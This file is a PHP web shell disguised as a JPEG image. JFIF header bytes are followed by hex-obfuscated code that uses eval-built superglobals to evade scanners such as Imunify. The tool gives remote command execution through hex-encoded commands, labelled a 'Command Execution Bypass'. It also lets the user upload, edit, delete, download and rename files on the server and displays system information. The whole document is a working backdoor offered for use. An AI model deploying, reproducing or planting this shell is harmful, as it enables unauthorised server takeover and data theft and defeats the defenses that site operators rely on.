����JFIF��x�x�����C�		



	
���C�����"��������������	
�������}�!1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
������w�!1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?�����N����m?����j����EP��
<?php

/*
 * This file just for test for server who using imunify,cloudflare etc,
 *
 * (c) Setsuna Watanabe <yucaerin@hotmail.com>
 *
 * GOOD LUCK, HAVE FUN!
 */

session_start();
error_reporting(E_ALL);
header("X-XSS-Protection: 0");
ob_start();
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', FALSE);

$Array = [
    '6d6b',
    '646972',
    '6765745f66696c655f7065726d697373696f6e73',
    '69735f7772697461626c655f7065726d697373696f6e',
    '65786563757465436f6d6d616e64',
    '70726f635f6f70656e',
    '73747265616d5f6765745f636f6e74656e7473',
    '66696c655f6765745f636f6e74656e7473',
    '66696c655f7075745f636f6e74656e7473',
    '62696e32686578',
    '6d6f76655f75706c6f616465645f66696c65',
    '68746d6c7370656369616c6368617273',
    '6865783262696e',
    '7068705f756e616d65',
    '7363616e646972',
    '69735f646972',
    '66696c655f657869737473',
    '7265616466696c65',
    '66696c6573697a65',
    '69735f7772697461626c65',
    '72656e616d65',
    '66696c657065726d73',
    '737072696e7466',
    '737562737472',
    '66636c6f7365',
    '70726f635f6f70656e',
    '69735f7265736f75726365',
    '70726f635f636c6f7365',
    '756e6c696e6b',
    '69735f66696c65',
    '4554', //30
    '564552',
    '53494f4e',
    '4c4553',
    '5354',
];

$SETSUNA = [];
foreach ($Array as $hexString) {
    $SETSUNA[] = hex2bin($hexString);
}

$satu = '_G';
$dua = $SETSUNA[30];
$tiga = '_SER';
$empat = $SETSUNA[31];
$lima = '_SES';
$enam = $SETSUNA[32];
$tujuh = '_FI';
$delapan = $SETSUNA[33];
$sembilan = '_PO';
$sepuluh = $SETSUNA[34];

// Gunakan $SETSUNA sesuai kebutuhan
$a = $SETSUNA[0];
$b = $SETSUNA[1];
$c = $a . $b;
$L = eval('return $' . $satu . $dua . ';');
$M = eval('return $' . $tiga . $empat . ';');
$N = eval('return $' . $lima . $enam . ';');
$e = eval('return $' . $tujuh . $delapan . ';');
$o = eval('return $' . $sembilan . $sepuluh . ';');
$f = $SETSUNA[2];
$g = $SETSUNA[3];
$h = $SETSUNA[4];
$i = $SETSUNA[5];
$j = $SETSUNA[6];
$q = $SETSUNA[7];
$s = $SETSUNA[8];
$v = $SETSUNA[9];
$w = $SETSUNA[10];
$y = $SETSUNA[11];
$z = $SETSUNA[12];
$NM = $SETSUNA[13];
$SCN = $SETSUNA[14];
$ID = $SETSUNA[15];
$FE = $SETSUNA[16];
$RF = $SETSUNA[17];
$FS = $SETSUNA[18];
$IW = $SETSUNA[19];
$RNM = $SETSUNA[20];
$FP = $SETSUNA[21];
$SPRF = $SETSUNA[22];
$SBSR = $SETSUNA[23];
$FCL = $SETSUNA[24];
$PROP = $SETSUNA[25];
$IR = $SETSUNA[26];
$PRCL = $SETSUNA[27];
$UNL = $SETSUNA[28];
$ISF = $SETSUNA[29];

$dir = isset($L['dir']) ? $z($L['dir']) : '.';
$files = $SCN($dir);
$upload_message = '';
$edit_message = '';
$delete_message = '';
$create_dir_message = '';

// Function to create a new directory
function createDirectory($dir, $newDirectoryName)
{
    $newDirPath = $dir . '/' . $newDirectoryName;

        global $ID;
    if (!$ID($newDirPath)) {
        global $c;
        if ($c($newDirPath, 0755, true)) {
            return "Directory '$newDirectoryName' created successfully.";
        } else {
            return "Failed to create directory. Check directory permissions or other errors.";
        }
    } else {
        return "Directory '$newDirectoryName' already available.";
    }
}

// Function to Download
if (isset($L['download'])) {
    $fileToDownload = $z($L['download']);
    global $FS;
    // Make sure that the requested file exists
    if ($FE($fileToDownload)) {
        // Set header to trigger download
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($fileToDownload) . '"');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . $FS($fileToDownload));
        $RF($fileToDownload);
        exit;
    } else {
        // Handle jika file tidak ditemukan
        echo "File not found.";
    }
}

// Function to get file permissions
function f($file): string {
    global $FP, $SPRF, $SBSR;
    return $SBSR($SPRF('%o', $FP($file)), -4);
}

// Function to check write permissions
function g($file): bool {
    global $IW;
    return $IW($file);
}

// Function to execute a command
function h($command, $workingDirectory = null)
{
    global $j, $FCL, $PROP, $IR, $PRCL;

    $descriptorspec = array(
       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
       2 => array("pipe", "w")   // stderr is a pipe that the child will write to
    );

    $process = $PROP($command, $descriptorspec, $pipes, $workingDirectory);

    if ($IR($process)) {
        // Read output from stdout and stderr
        $output_stdout = $j($pipes[1]); // Ganti dengan $SETSUNA[6] jika diperlukan
        $output_stderr = $j($pipes[2]); // Ganti dengan $SETSUNA[6] jika diperlukan

        $FCL($pipes[0]);
        $FCL($pipes[1]);
        $FCL($pipes[2]);

        $return_value = $PRCL($process);

        return "Output (stdout):\n" . $output_stdout . "\nOutput (stderr):\n" . $output_stderr;
    } else {
        return "Failed to execute command.";
    }
}


if (isset($L['636d64'])) {
    $command = $z($L['636d64']);
    $result = h($command, $dir);
}

if (isset($e['file_upload'])) {
    $tempFile = $e['file_upload']['tmp_name'];
    $targetFile = $dir . '/' . $e['file_upload']['name'];
    if ($w($tempFile, $targetFile)) {
        $upload_message = 'File uploaded successfully.';
    } else {
        $upload_message = 'Failed to upload file.';
    }
}

//function for edit file
if (isset($o['edit_file'])) {
    $file = $o['edit_file'];
    $content = $q($file);
    if ($content !== false) {
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Edit File</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 0;
                    text-align: center;
                }
                header {
                    background-color: #4CAF50;
                    color: white;
                    padding: 1rem;
                }
                header h1 {
                    margin: 0;
                }
                main {
                    padding: 1rem;
                }
                form {
                    width: 50%;
                    margin: auto;
                    text-align: left;
                }
                textarea {
                    width: 100%;
                    height: 300px;
                }
                input[type="submit"] {
                    background-color: #4CAF50;
                    border: none;
                    color: white;
                    cursor: pointer;
                    margin-top: 1rem;
                    padding: 0.5rem 1rem;
                    text-align: center;
                    text-decoration: none;
                    display: inline-block;
                    font-size: 12px;
                }
                input[type="submit"]:hover {
                    background-color: #45a049;
                }
                .btn {
                    background-color: #4CAF50;
                    border: none;
                    color: white;
                    cursor: pointer;
                    margin-left: 1rem;
                    padding: 0.5rem 1rem;
                    text-align: center;
                    text-decoration: none;
                    display: inline-block;
                    font-size: 12px;
                }

                .btn-download {
                    background-color: #008CBA; /* Ganti warna sesuai kebutuhan */
                    border: none;
                    color: white;
                    cursor: pointer;
                    margin-left: 1rem;
                    padding: 0.5rem 1rem;
                    text-align: center;
                    text-decoration: none;
                    display: inline-block;
                    font-size: 12px;
                }

                .btn:hover {
                    background-color: #45a049;
                }
            </style>
        </head>
        <body>
            <header>
                <h1>Edit File</h1>
            </header>
            <main>
                <form method="post" action="">
                    <textarea id="CopyFromTextArea" name="file_content" rows="10" class="form-control"><?php echo $y($content); ?></textarea>
                    <input type="hidden" name="edited_file" value="<?php echo $y($file); ?>">
                    <input type="submit" name="submit_edit" value="Submit">
                </form>
            </main>
        </body>
        </html>
        <?php
        exit;
    } else {
        $edit_message = 'Gagal membaca isi file.';
    }
}

if (isset($o['submit_edit'])) {
    $file = $o['edited_file'];
    $content = $o['file_content'];
    if ($s($file, $content) !== false) {
        $edit_message = 'File Edit Successfully.';
    } else {
        $edit_message = 'Failed To Edit File.';
    }
}

if (isset($o['delete_file'])) {
    global $UNL;
    $file = $o['delete_file'];
    if ($UNL($file)) {
        $delete_message = 'File deleted successfully.';
    } else {
        $delete_message = 'Failed to delete file.';
    }
}

if (isset($o['create_dir'])) {
    $newDirName = $o['new_dir_name'];
    $create_dir_message = createDirectory($dir, $newDirName);
}

// Proses form rename jika disubmit
if ($M['REQUEST_METHOD'] === 'POST') {
    if (isset($o['old_name']) && isset($o['new_name'])) {
        $old_name = $o['old_name'];
        $new_name = $o['new_name'];

        $old_path = $dir . '/' . $old_name;
        $new_path = $dir . '/' . $new_name;

        if ($RNM($old_path, $new_path)) {
            global $RNM, $y;
            showMessage("Successfully changed the name from $old_name to $new_name.", $y);
        } else {
            global $y;
            showMessage("Failed To Change The Name. Make sure the old file/directory name is correct.", $y);
        }
    }
}

// Fungsi untuk menampilkan pesan
function showMessage($message, $y)
{
    echo '<p>' . z($message) . '</p>';
}

$un = $NM();
$current_dir = realpath($dir);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SIMPEL BANGET NIH SHELL</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        header {
            background-color: #4CAF50;
            color: white;
            padding: 1rem;
        }
        header h1 {
            margin: 0;
        }
        main {
            padding: 1rem;
        }
        table {
            border-collapse: collapse;
            margin: 1rem auto;
            width: 50%;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 0.5rem;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        tr:nth-child(even) {
            background-color: #f2f2f2;
        }
        tr:hover {
            background-color: #ddd;
        }
        form {
            display: inline-block;
            margin: 1rem 0;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            border: none;
            color: white;
            cursor: pointer;
            margin-left: 1rem;
            padding: 0.5rem 1rem;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 12px;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        /* Gaya CSS untuk hasil command */
        div {
            background-color: #f9f9f9;
            border: 1px solid #ddd;
            padding: 10px;
            margin-top: 20px;
            overflow: auto;
        }

        pre {
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .btn {
            background-color: #4CAF50;
            border: none;
            color: white;
            cursor: pointer;
            margin-left: 1rem;
            padding: 0.5rem 1rem;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 12px;
        }

        .btn-download {
            background-color: #008CBA; /* Ganti warna sesuai kebutuhan */
            border: none;
            color: white;
            cursor: pointer;
            margin-left: 1rem;
            padding: 0.5rem 1rem;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 12px;
        }

        .btn:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <header>
        <h1>SIMPEL BANGET NIH SHELL</h1>
    </header>
    <main>
        <p>Current directory: <?php echo($current_dir); ?></p>
        <p>Server information: <?php echo $un; ?></p>
        <?php if (!empty($upload_message)): ?>
        <p><?php echo($upload_message); ?></p>
        <?php endif; ?>
        <?php if (!empty($edit_message)): ?>
        <p><?php echo($edit_message); ?></p>
        <?php endif; ?>
        <?php if (!empty($delete_message)): ?>
        <p><?php echo($delete_message); ?></p>
        <?php endif; ?>
        <?php if (!empty($create_dir_message)): ?>
        <p><?php echo($create_dir_message); ?></p>
        <?php endif; ?>
        <form method="POST" enctype="multipart/form-data">
            <label>Upload file:</label>
            <input type="file" name="file_upload">
            <input type="submit" value="Upload">
            <input type="hidden" name="dir" value="<?php echo($dir); ?>">
        </form>
        </br>
        <form method="POST">
            <label>Create directory:</label>
            <input type="text" name="new_dir_name" required>
            <input type="submit" name="create_dir" value="Create">
            <input type="hidden" name="dir" value="<?php echo($dir); ?>">
        </form>
        </br>
            <form action="" method="post">
            <label>Name file/Directory:</label> <input name="old_name" type="text">
            <label>New Name File/Directory:</label> <input name="new_name" type="text">
            <input type="submit" value="Change Name">
        </form>
        <table>
            <tr>
                <th>Filename</th>
                <th>Permissions</th>
                <th>Actions</th>
            </tr>
            <?php foreach ($files as $file): ?>
            <tr>
                <td>
                    <?php if ($ID($dir . '/' . $file)): ?>
                    <a href="?dir=<?php echo $v($dir . '/' . $file); ?>" style="color: <?php echo g($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></a>
                    <?php else: ?>
                    <?php echo $file; ?></a>
                    <?php endif; ?>
                </td>
                <td style="color: <?php echo g($dir . '/' . $file) ? 'green' : 'red'; ?>">
                    <?php echo $ISF($dir . '/' . $file) ? f($dir . '/' . $file) : (g($dir . '/' . $file) ? 'Directory' : 'Directory (No writable)'); ?>
                </td>
                <td>
                    <?php if ($ISF($dir . '/' . $file)): ?>
                    <form action="" method="post" style="display: inline-block;">
                        <input type="hidden" name="edit_file" value="<?php echo $dir . '/' . $file; ?>">
                        <button type="submit" class="btn btn-download">Edit</button>
                    </form>
                    <form action="" method="post" style="display: inline-block;">
                        <input type="hidden" name="delete_file" value="<?php echo $dir . '/' . $file; ?>">
                        <button type="submit" class="btn btn-download">Delete</button>
                    </form>
                    <form action="" method="get" style="display: inline-block;">
                    <input type="hidden" name="download" value="<?php echo bin2hex($dir . '/' . $file); ?>">
                    <button type="submit" class="btn btn-download">Download</button>
                    </form>
                    <?php endif; ?>
                </td>
            </tr>
            <?php endforeach; ?>
        </table>
        <p><b>Command Execution Bypass</b></p>
        <form method="GET">
            <label>encode your command on <b><a href="https://encode-decode.com/bin2hex-decode-online/">https://encode-decode.com/bin2hex-decode-online/</a> :</b></label><br><br>
            <input type="hidden" name="dir" value="<?php echo $v($dir); ?>">
            <input type="text" name="636d64" placeholder="e.g., 6c73306c 616c6c"><br><br>
            <input type="submit" value="Execute">
        </form>
        <?php if (isset($result)): ?>
            <div>
                <h2>Command Result:</h2>
                <pre><?php echo $y($result); ?></pre>
            </div>
        <?php endif; ?>
    </main>
</body>
</html>